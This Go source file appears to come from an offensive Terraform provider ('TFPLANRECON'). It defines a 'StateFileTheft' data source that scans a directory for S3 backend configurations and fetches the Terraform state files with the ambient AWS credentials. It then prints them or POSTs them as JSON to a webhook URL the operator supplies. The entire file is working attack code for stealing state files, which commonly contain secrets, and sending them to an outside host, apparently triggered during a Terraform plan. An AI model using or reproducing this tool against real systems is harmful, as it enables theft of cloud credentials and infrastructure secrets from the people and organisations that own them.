package techniques

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/s3"
	"github.com/hashicorp/terraform-plugin-sdk/v2/diag"
	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
)

// StateFileTheft returns the schema for Terraform state file theft data source
func StateFileTheft() *schema.Resource {
	return &schema.Resource{
		ReadContext: stateFileTheftRead,

		Schema: map[string]*schema.Schema{
			"search_path": {
				Type:        schema.TypeString,
				Optional:    true,
				Default:     ".",
				Description: "Path to search for Terraform configuration files and backend configs",
			},
			"webhook_url": {
				Type:        schema.TypeString,
				Optional:    true,
				Description: "Optional webhook URL to send state files to (if not provided, state is printed to console)",
			},
			"aws_region": {
				Type:        schema.TypeString,
				Optional:    true,
				Default:     "us-east-1",
				Description: "AWS region to use for S3 operations",
			},
		},
	}
}

type BackendConfig struct {
	Type   string
	Bucket string
	Key    string
	Region string
}

func stateFileTheftRead(ctx context.Context, d *schema.ResourceData, m interface{}) diag.Diagnostics {
	var diags diag.Diagnostics
	searchPath := d.Get("search_path").(string)
	webhookURL := d.Get("webhook_url").(string)
	awsRegion := d.Get("aws_region").(string)

	diags = append(diags, diag.Diagnostic{
		Severity: diag.Warning,
		Summary:  "TFPLANRECON Terraform State File Theft",
		Detail:   fmt.Sprintf("Scanning for Terraform backend configurations in %s", searchPath),
	})

	// Scan for backend configurations
	backendConfigs, err := scanForBackendConfigs(searchPath)
	if err != nil {
		return diag.FromErr(fmt.Errorf("failed to scan for backend configs: %v", err))
	}

	if len(backendConfigs) == 0 {
		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "No Backend Configurations Found",
			Detail:   fmt.Sprintf("No Terraform backend configurations found in %s", searchPath),
		})
		d.SetId("no-backends")
		return diags
	}

	stateFiles := make(map[string]string)
	
	// Try to retrieve state files from each backend
	for _, backend := range backendConfigs {
		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "Found Backend Configuration",
			Detail:   fmt.Sprintf("Backend type: %s, Bucket: %s, Key: %s, Region: %s", backend.Type, backend.Bucket, backend.Key, backend.Region),
		})

		if backend.Type == "s3" {
			stateContent, err := retrieveS3StateFile(backend, awsRegion)
			if err != nil {
				diags = append(diags, diag.Diagnostic{
					Severity: diag.Warning,
					Summary:  "Failed to Retrieve State File",
					Detail:   fmt.Sprintf("Error retrieving state from s3://%s/%s: %v", backend.Bucket, backend.Key, err),
				})
				continue
			}
			
			stateKey := fmt.Sprintf("s3://%s/%s", backend.Bucket, backend.Key)
			stateFiles[stateKey] = stateContent
			
			diags = append(diags, diag.Diagnostic{
				Severity: diag.Warning,
				Summary:  "Successfully Retrieved State File",
				Detail:   fmt.Sprintf("Retrieved state file from %s (%d bytes)", stateKey, len(stateContent)),
			})
		}
	}

	if len(stateFiles) == 0 {
		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "No State Files Retrieved",
			Detail:   "Could not retrieve any state files from discovered backends",
		})
		d.SetId("no-states")
		return diags
	}

	// Convert state files to string for display or send to webhook
	var statesList []string
	for location, content := range stateFiles {
		// Truncate content for display purposes
		displayContent := content
		if len(displayContent) > 1000 {
			displayContent = displayContent[:1000] + "... [truncated]"
		}
		statesList = append(statesList, fmt.Sprintf("=== %s ===\n%s", location, displayContent))
	}
	statesString := strings.Join(statesList, "\n\n")

	if webhookURL != "" {
		// Send to webhook
		config := m.(*ProviderConfig)
		client := config.Client

		payload, err := json.Marshal(stateFiles)
		if err != nil {
			return diag.FromErr(fmt.Errorf("error marshaling state files: %s", err))
		}

		req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(payload))
		if err != nil {
			return diag.FromErr(fmt.Errorf("error creating request: %s", err))
		}

		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			return diag.FromErr(fmt.Errorf("error sending state files to webhook: %s", err))
		}
		defer resp.Body.Close()

		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "Terraform State Files Sent to Webhook",
			Detail:   fmt.Sprintf("Sent %d state files to %s", len(stateFiles), webhookURL),
		})
	} else {
		// Print to console via diagnostic
		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "Terraform State Files Extracted",
			Detail:   fmt.Sprintf("Found %d state files:\n%s", len(stateFiles), statesString),
		})
	}

	d.SetId(fmt.Sprintf("state-theft-%d", len(stateFiles)))
	return diags
}

func scanForBackendConfigs(searchPath string) ([]BackendConfig, error) {
	var configs []BackendConfig
	
	err := filepath.Walk(searchPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Continue on errors
		}
		
		if strings.HasSuffix(path, ".tf") || strings.HasSuffix(path, ".tf.json") {
			content, err := os.ReadFile(path)
			if err != nil {
				return nil // Continue on errors
			}
			
			// Simple regex-like parsing for backend configurations
			contentStr := string(content)
			
			// Look for S3 backend configurations
			if strings.Contains(contentStr, `backend "s3"`) || strings.Contains(contentStr, `"backend": "s3"`) {
				config := parseS3BackendConfig(contentStr)
				if config.Bucket != "" && config.Key != "" {
					configs = append(configs, config)
				}
			}
		}
		
		return nil
	})
	
	return configs, err
}

func parseS3BackendConfig(content string) BackendConfig {
	config := BackendConfig{Type: "s3"}
	
	// Simple string parsing - look for common patterns
	lines := strings.Split(content, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		
		// Parse bucket
		if strings.Contains(line, "bucket") && strings.Contains(line, "=") {
			parts := strings.Split(line, "=")
			if len(parts) > 1 {
				bucket := strings.Trim(strings.TrimSpace(parts[1]), `"`)
				bucket = strings.TrimSuffix(bucket, ",")
				config.Bucket = bucket
			}
		}
		
		// Parse key
		if strings.Contains(line, "key") && strings.Contains(line, "=") && !strings.Contains(line, "bucket") {
			parts := strings.Split(line, "=")
			if len(parts) > 1 {
				key := strings.Trim(strings.TrimSpace(parts[1]), `"`)
				key = strings.TrimSuffix(key, ",")
				config.Key = key
			}
		}
		
		// Parse region
		if strings.Contains(line, "region") && strings.Contains(line, "=") {
			parts := strings.Split(line, "=")
			if len(parts) > 1 {
				region := strings.Trim(strings.TrimSpace(parts[1]), `"`)
				region = strings.TrimSuffix(region, ",")
				config.Region = region
			}
		}
	}
	
	// Default region if not specified
	if config.Region == "" {
		config.Region = "us-east-1"
	}
	
	return config
}

func retrieveS3StateFile(backend BackendConfig, defaultRegion string) (string, error) {
	region := backend.Region
	if region == "" {
		region = defaultRegion
	}
	
	sess, err := session.NewSession(&aws.Config{
		Region: aws.String(region),
	})
	if err != nil {
		return "", fmt.Errorf("failed to create AWS session: %v", err)
	}
	
	s3Client := s3.New(sess)
	
	getObjectInput := &s3.GetObjectInput{
		Bucket: aws.String(backend.Bucket),
		Key:    aws.String(backend.Key),
	}
	
	result, err := s3Client.GetObject(getObjectInput)
	if err != nil {
		return "", fmt.Errorf("failed to get object from S3: %v", err)
	}
	defer result.Body.Close()
	
	content, err := io.ReadAll(result.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read object content: %v", err)
	}
	
	return string(content), nil
}